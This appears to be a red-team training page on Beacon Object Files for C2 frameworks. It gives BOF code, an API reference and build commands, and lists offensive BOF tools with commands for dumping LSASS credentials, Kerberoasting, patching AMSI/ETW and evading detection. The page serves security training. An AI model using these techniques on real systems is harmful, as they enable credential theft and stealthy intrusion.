---
layout: training-page
title: "Beacon Object Files (BOFs) — Red Team Academy"
module: "C2 Frameworks"
tags:
  - bof
  - beacon-object-files
  - cobalt-strike
  - havoc
  - in-memory
page_key: "c2-bof"
render_with_liquid: false
---

# Beacon Object Files (BOFs)

Beacon Object Files are compiled COFF (Common Object File Format) files executed in-memory inside a C2 agent. Originally a Cobalt Strike feature, BOFs are now supported by Havoc, Brute Ratel, and other frameworks. BOFs avoid disk-based detections (no new process/DLL), can call Win32 APIs via beacon APIs, and enable custom post-exploitation without spawning cmd.exe or PowerShell.

## BOF Architecture

```
# BOF = COFF object file (.obj) — not a full PE
# Loaded by C2 agent directly into its memory
# Executed in the agent's thread (or separate thread)
# Cleaned up after execution

# Why BOFs?
# - No new process = no process creation events
# - No disk artifact = no AV file scan
# - No PowerShell/cmd.exe = no script block logging
# - Small footprint: just a .obj file
# - Reusable across engagements

# Limitations:
# - Crashes in BOF kill the agent (same process)
# - No persistent state between BOF calls
# - Limited stack size
# - Must use beacon API for WinAPI calls (or import dynamically)

# BOF API headers (from Cobalt Strike SDK):
# beacon.h — beacon APIs
# bofdefs.h — data type definitions
```

## Writing a BOF

```
#include <windows.h>
#include "beacon.h"  // from CS SDK or TrustedSec copy

// BOF entry point: go()
void go(char* args, int alen) {
    // Parse arguments (packed by C2):
    datap parser;
    BeaconDataParse(&parser, args, alen);
    // Example: read a string arg
    // char* targetHost = BeaconDataExtract(&parser, NULL);

    // Call Win32 APIs via DECLAREIND (resolve dynamically):
    WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
    // Macro: MODULEAPI$FunctionName  — resolved at runtime

    HANDLE hProc = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, 1234);

    // Output to beacon console:
    BeaconPrintf(CALLBACK_OUTPUT, "Process handle: %p\n", hProc);

    // Format output:
    formatp buffer;
    BeaconFormatAlloc(&buffer, 1024);
    BeaconFormatPrintf(&buffer, "PID: %d\n", GetCurrentProcessId());
    BeaconOutput(CALLBACK_OUTPUT, BeaconFormatToString(&buffer, NULL), -1);
    BeaconFormatFree(&buffer);
}

// Compile:
// x86_64-w64-mingw32-gcc -o bof.obj -c bof.c -masm=intel
```

## BOF API Reference

```
# Key beacon.h APIs:

# Data parsing:
BeaconDataParse(datap* parser, char* buffer, int size)
BeaconDataInt(datap* parser)        # read int
BeaconDataShort(datap* parser)      # read short
BeaconDataLength(datap* parser)     # remaining bytes
BeaconDataExtract(datap* parser, int* size)  # read byte array

# Output:
BeaconPrintf(type, fmt, ...)        # printf to console
BeaconOutput(type, data, len)       # raw output
# types: CALLBACK_OUTPUT, CALLBACK_ERROR, CALLBACK_OUTPUT_OOB

# Format buffer (for structured output):
BeaconFormatAlloc(formatp* b, int maxsz)
BeaconFormatPrintf(formatp* b, char* fmt, ...)
BeaconFormatToString(formatp* b, int* size)
BeaconFormatFree(formatp* b)

# Win32 API resolution (module$function pattern):
# Prefixing with module name auto-resolves via GetProcAddress-equivalent
# KERNEL32$VirtualAlloc, NTDLL$NtAllocateVirtualMemory, etc.

# Token operations:
BeaconUseToken(HANDLE token)
BeaconRevertToken()
BeaconIsAdmin()
```

## Building BOFs

```
# Standard compile (mingw):
x86_64-w64-mingw32-gcc -o mybof.x64.obj -c mybof.c \
  -masm=intel -Wall -Wno-unused-variable

# 32-bit:
i686-w64-mingw32-gcc -o mybof.x86.obj -c mybof.c -masm=intel

# Using nmake (Visual Studio):
cl /c /GS- /Fo"mybof.x64.obj" mybof.c

# BOF packer (BOF.NET — .NET in a BOF):
# https://github.com/CCob/BOF.NET
# Run .NET assemblies inside a BOF — no new process

# BOF loader testing (local):
# COFFLoader — run BOFs locally without a C2:
git clone https://github.com/trustedsec/COFFLoader
./COFFLoader mybof.x64.obj [args]

# Headless BOF execution via CS aggressor script:
sub exec_bof {
    $bof = readb(script_resource("mybof.x64.obj"));
    beacon_inline_execute($bid, $bof, "go", $packed_args);
}
```

## Popular BOF Collections

```
# TrustedSec Situational Awareness BOFs:
git clone https://github.com/trustedsec/CS-Situational-Awareness-BOF
# Includes: whoami, netstat, enumLocalAdmins, nslookup,
#           wWinRM, ipconfig, hostname, ldapsearch

# TrustedSec Offensive Operations BOFs:
git clone https://github.com/trustedsec/CS-Remote-OPs-BOF
# Includes: rdpthief, procdump, wdigest, nanodump (LSASS)

# Outflank C2 BOFs:
git clone https://github.com/outflanknl/C2-Tool-Collection
# chromeKey, domaininfo, dumpert, procdump

# nanodump — LSASS dump via BOF (key technique):
# https://github.com/helpsystems/nanodump
nanodump --write C:\Windows\Temp\tmp.dmp
# Extracts LSASS creds without running mimikatz

# Kerberoast BOF (no Rubeus needed):
# Part of CS-Remote-OPs-BOF
bof_kerberoast --format hashcat   # outputs hashes for offline cracking

# Sektor7 BOF collection:
# AMSIbof, ETWbof — patch AMSI/ETW via BOF
```

## Using BOFs in Havoc

```
# Havoc supports BOFs natively:
# Interact tab → BOF → browse to .obj file

# Or from console:
inline-execute /path/to/bof.x64.obj [args]

# Packed arguments:
# Use bof_pack() to pack arguments:
inline-execute bof.x64.obj pack("s", "hostname_to_resolve")
# Format string: i=int, s=short, z=string, Z=wstring, b=binary

# Example: run whoami BOF:
inline-execute /opt/CS-Situational-Awareness-BOF/src/SA/whoami/whoami.x64.obj

# Check output in console:
# [BOF] Output:
# UserName: DOMAIN\operator
# ...

# Using BOF.NET (run .NET inline):
# Compile your C# as .NET Framework DLL
# Use BOF.NET loader to exec it inside agent
inline-execute bofnet_init
inline-execute bofnet_load Seatbelt.dll
inline-execute bofnet_execute Seatbelt AntiVirus TokenPrivileges
```

## Resources

- TrustedSec SA BOFs — `github.com/trustedsec/CS-Situational-Awareness-BOF`
- TrustedSec Remote Ops BOFs — `github.com/trustedsec/CS-Remote-OPs-BOF`
- COFFLoader — `github.com/trustedsec/COFFLoader`
- BOF.NET — `github.com/CCob/BOF.NET`
- nanodump — `github.com/helpsystems/nanodump`
- Cobalt Strike BOF Documentation — `hstechdocs.helpsystems.com`
